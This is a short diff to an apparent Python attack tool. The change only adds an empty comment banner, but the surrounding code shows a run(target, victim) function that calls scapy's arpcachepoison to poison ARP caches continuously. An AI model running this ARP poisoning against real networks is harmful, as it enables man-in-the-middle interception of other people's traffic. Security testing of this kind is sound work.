@@ -7,6 +7,10 @@ from scapy.layers.l2 import arpcachepoison
 from scapy.all import sendp
 
 
+# --------------------------------------------------------------------------
+#
+# --------------------------------------------------------------------------
+
 def run(target, victim):
     arpcachepoison(target=str(target), victim=str(victim), interval=0)
 
